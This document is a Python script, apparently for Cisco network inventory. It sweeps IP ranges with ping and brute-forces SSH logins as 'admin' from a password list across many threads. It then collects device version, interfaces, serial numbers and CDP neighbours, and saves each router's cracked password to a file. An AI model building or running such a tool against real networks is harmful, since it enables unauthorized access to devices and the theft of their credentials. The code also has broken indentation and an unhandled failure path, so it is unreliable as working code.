import re
import time
import paramiko #needs to be imported
import threading
import os.path
import subprocess
import sys
import matplotlib.pyplot as plt

#a function to get the network information in ip/cidr_net_mask format and return
#a list with all the ips in the network
def generate_ip_list(ip_mask):
    ip_list = []
    for i in range(len(ip_mask)):
    	#split the network and the ip mask
    	ip_mask[i] = ip_mask[i].split("/")
    	net = ip_mask[i][0]
    	cidr = int(ip_mask[i][1])
    	net = net.split(".")
    	#find the ip range
    	net_range = 32 - cidr
    	#generate the ips in the network
    	for i in range(int(net[3]),int(net[3])+2**net_range):
        	ip_list.append(net[0]+"."+net[1]+"."+net[2]+"."+str(i))
    return ip_list


#a fuction that tests connectivity for every ip in range
def ip_validate(ip_list):
    clean_list = []
    for ip in ip_list:
        ping_reply = subprocess.call(['ping', '-c', '2', '-w', '2', '-q', '-n', ip])
        if ping_reply == 0:
            clean_list.append(ip)
    return clean_list

#a function that brute forces every machine to find its password and returns a
# [ip,password] list
def cracker(ip):

    pass_file = open("password.txt", 'r')
    pass_list = map(str.rstrip, pass_file.readlines())
    for password in pass_list:
        try:
            #Logging into device
            session = paramiko.SSHClient()

            #For testing purposes, this allows auto-accepting unknown host keys
            #Do not use in production! The default would be RejectPolicy
            session.set_missing_host_key_policy(paramiko.AutoAddPolicy())

            #Passing the necessary parameters
            session.connect(ip, username = "admin", password = password)

            #Start an interactive shell session on the router
            connection = session.invoke_shell()
            #Setting terminal length for entire output - no pagination
            connection.send("terminal length 0\n")
            time.sleep(1)
            neighbours = extract_data(connection,ip,password)
            #Closing the connection
            session.close()
	    break
        except paramiko.AuthenticationException:
	    continue

    return neighbours

def extract_data(connection,ip,password):
    # Commands for ssh data extraction
    selected_cisco_commands = '''show version&\  
                              show ip int brief | include (Ethernet|Serial)&  
                              show diag&
                              show inventory&  
                              show cdp neighbors detail | include Device ID''' # find topology

    #Splitting commands by the "&" character

    command_list = selected_cisco_commands.split("&")

    #Writing each line in the command string to the device

    for each_line in command_list:
        connection.send(each_line + '\n')
        time.sleep(3)

    #Checking command output for IOS syntax errors
    output = connection.recv(65535)


    if re.search(r"% Invalid input detected at", output):
        print("* There was at least one IOS syntax error on device {}".format(ip))

    else:
        print("* All parameters were extracted from device {}".format(ip))


    hardware_version = re.search(r"C\d+-\w+-\w",output)

    ip_int_brief = re.findall(r"((FastEthernet|Serial)\d\/\d.*\n)", ''.join(output))
    ip_int_br = [''.join(x[0]) for x in ip_int_brief]
    ip_int_br = '\n'.join(ip_int_br) #convert list to string

    inventory = re.findall(r"NAME:.*\nPID:.*", ''.join(output))
    inv = '\n'.join(inventory) #convert list to string

    dev_os = re.search(r"Version \d.\.\d\(\w+\)", output)

    dev_cdp_neighbors = re.findall(r"Device ID: (.+)\r\n", output)
    all_cdp_neighbors = ','.join(dev_cdp_neighbors)

    SN = re.search(r"Chassis Serial Number *: (.*)",output) # grep SN for dream part

    # Write Results in a txt file
    filename = 'Results/%s.txt' % ip
    with open(filename,'w') as file1:
	file1.write("Router's Hardware Version is: "+hardware_version.group(0)+'\n')
	file1.write("\nThe OS running on the router is: "+dev_os.group(0)+'\n')
	file1.write("\nManagement IP address is: "+ip+'\n')
	file1.write("\nRouter's password is: "+password+'\n')
        file1.write("\nRouter's SN: "+SN.group(1)+'\n')
	file1.write("\nRouter's installed modules and status is:\n"+inv+'\n')
	file1.write("\nRouter's interface description and status are:\n"+ip_int_br+'\n')
	file1.write("Device Neighbors are: \n"+all_cdp_neighbors+'\n')


    return all_cdp_neighbors


#Creating threads
def create_threads(ip_list):
    threads = []
    for ip in ip_list:
        th = threading.Thread(target = cracker, args = (ip,))   #args is a tuple with a single element
        th.start()
        threads.append(th)
    for th in threads:
        th.join()

#main
range_file = open("range.txt", 'r')
net = range_file.readlines()[0].rstrip("\n")
net = net.split(',')
ip_list = generate_ip_list(net)
clean_list = ip_validate(ip_list)
create_threads(clean_list)

